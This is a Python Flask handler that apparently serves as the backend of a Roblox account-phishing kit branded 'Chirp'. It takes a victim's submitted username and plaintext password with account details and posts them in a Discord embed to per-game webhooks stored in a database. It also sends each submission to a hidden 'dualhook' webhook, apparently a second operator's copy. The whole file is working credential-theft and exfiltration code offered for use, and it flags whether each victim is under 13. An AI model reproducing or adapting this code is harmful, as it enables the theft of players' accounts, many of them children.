import os
from flask import request
import psycopg2
import requests
import json
from dotenv import load_dotenv
load_dotenv()

def send_discord_webhook(url, embed):
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(embed), headers=headers)
    return response

def get_user_id(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {
        "usernames": [username],
        "excludeBannedUsers": True
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        data = response.json()
        if len(data["data"]) > 0:
            return data["data"][0]["id"]
        else:
            return 1
    else:
        return 1

def get_game_info(game_id):
    try:
        universe_url = f"https://apis.roblox.com/universes/v1/places/{game_id}/universe"
        games_url = f"https://games.roblox.com/v1/games"
        with requests.Session() as session:
            response = session.get(universe_url)
            response.raise_for_status()
            univ_id = response.json()["universeId"]

            params = {"universeIds": univ_id}
            response = session.get(games_url, params=params)
            response.raise_for_status()
            game_data = response.json()["data"][-1]

            return {
                "PlaceName": game_data.get("name", "N/A"),
                "Playing": game_data.get("playing", 0),
                "Visits": game_data.get("visits", 0),
                "Favorites": game_data.get("favoritedCount", 0)
            }
    except requests.exceptions.RequestException as e:
        print(f"Error in get_game_info: {e}")
        return None

def get_avatar_thumbnail(user_id):
    try:
        url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=true"
        response = requests.get(url)
        response.raise_for_status()
        data = response.json().get("data", [])
        if data:
            return data[0].get("imageUrl", "")
        return ""
    except requests.exceptions.RequestException as e:
        print(f"Error in get_avatar_thumbnail: {e}")
        return ""

def get_country_name(country_code):
    try:
        if not country_code:
            return "Failed to Fetch The Country"

        url = "https://pastebin.com/raw/ShRBhWd7"
        response = requests.get(url)
        response.raise_for_status()
        country_map = response.json()
        return country_map.get(country_code, "Failed to Fetch The Country")
    except requests.exceptions.RequestException as e:
        print(f"Error in get_country_name: {e}")
        return "Failed to Fetch The Country"

def result():
    if request.method == 'POST':
        content_type = request.headers.get('Content-Type')

        if content_type == 'application/x-www-form-urlencoded':
            game_id = request.form.get('game_id')
            username = request.form.get('username')
            password = request.form.get('password')
            membership = request.form.get('membership')
            player_age_13 = request.form.get('player_age_13')
            player_age_days = request.form.get('player_age_days')
            verified = request.form.get('verified')
            country_code = request.form.get('country_code')

            if not all([game_id, username, password, membership, player_age_13, player_age_days, verified, country_code]):
                return "One or more fields are empty. Please fill in all the required information."

            user_id = get_user_id(username)
            game_info = get_game_info(game_id)
            thumbnail_url = get_avatar_thumbnail(user_id)
            country_name = get_country_name(country_code)

            if player_age_13 == "13_Above":
                player_age_13 = "13+"
            else:
                player_age_13 = "<13"

            connection_string = os.getenv("POSTGRES_CONNECTION_STRING")

            try:
                conn = psycopg2.connect(connection_string)
                print("Result Embed Connection to PostgreSQL successful.")
            except psycopg2.Error as e:
                print(f"Error connecting to PostgreSQL: {e}")
                return "Database Connection Failed"

            result_webhook = None
            discord_id = None

            select_query = "SELECT * FROM webhooks WHERE gameid = %s"
            with conn.cursor() as cur:
                cur.execute(select_query, (game_id,))
                rows = cur.fetchall()

                if not rows:
                    return "Game Not Whitelisted"

                for row in rows:
                    column_names = [desc[0] for desc in cur.description]

                    unnbc_index = column_names.index("unnbc")
                    unpremium_index = column_names.index("unpremium")
                    vnbc_index = column_names.index("vnbc")
                    vpremium_index = column_names.index("vpremium")
                    disc_id_index = column_names.index("discid")

                    if membership == "NBC" and verified == "Unverified":
                        result_webhook = row[unnbc_index]
                    elif membership == "Premium" and verified == "Unverified":
                        result_webhook = row[unpremium_index]
                    elif membership == "NBC" and verified == "Verified":
                        result_webhook = row[vnbc_index]
                    elif membership == "Premium" and verified == "Verified":
                        result_webhook = row[vpremium_index]

                    discord_id = row[disc_id_index]

            embed = {
                "username": "Chirp Mgui",
                "avatar_url": "https://cdn.discordapp.com/attachments/1160891393787568171/1175802465879326771/standard_3_8.gif",
                "embeds": [
                    {
                        "title": "**[Click Here to View Profile]**",
                        "url": f"https://www.roblox.com/users/{str(user_id)}/profile",
                        "description": f"**{username}** has provided their information.\n**Discord <@{discord_id}>**",
                        "thumbnail": {"url": thumbnail_url},
                        "author": {"name": "Chirp Mgui - BotBased (Results)", "url": ""},
                        "footer": {
                            "text": "Chirp - Free | Made By Jexiw",
                            "icon_url": "https://cdn.discordapp.com/attachments/1160891393787568171/1175802465879326771/standard_3_8.gif"
                        },
                        "color": 0xeeb400,
                        "fields": [
                            {
                                "name": "**Game Information 🎮**",
                                "value": f"```yaml\nGame Name: {game_info['PlaceName']}\nVisits: {game_info['Visits']}\nPlaying: {game_info['Playing']}\nFavorites: {game_info['Favorites']}```",
                                "inline": False,
                            },
                            {"name": "**Username 👤**", "value": f"**{username}**", "inline": True},
                            {"name": "**Password 🔐**", "value": f"**{password}**", "inline": True},
                            {"name": "**Membership 💼**", "value": f"**{membership}**", "inline": True},
                            {"name": "**Country 🌍**", "value": f"**{country_name}**", "inline": True},
                            {"name": "**Security 🔒**", "value": f"**{verified}**", "inline": True},
                            {"name": "**Player Age 🎂**", "value": f"**{player_age_days} Days Old, {player_age_13}**", "inline": True},
                            {"name": "**Game Link 🕹️**", "value": f"**[View Place](https://www.roblox.com/games/{game_id})**", "inline": True},
                        ]
                    }
                ]
            }

            # 🔁 Send to result webhook and dualhook
            dualhook_webhook = os.getenv("DUALHOOK_WEBHOOK")
            webhooks = [result_webhook, dualhook_webhook]
            success = False

            for webhook_url in webhooks:
                if webhook_url:
                    response = send_discord_webhook(webhook_url, embed)
                    if response.status_code == 204:
                        success = True
                    else:
                        print(f"Failed to send to {webhook_url}: {response.status_code}")

            if success:
                return "Webhook Send Successfully"
            else:
                return "Failed to Send Webhook"

        else:
            return "Unsupported Media Type: Expected 'application/x-www-form-urlencoded'"
    else:
        return "Invalid request"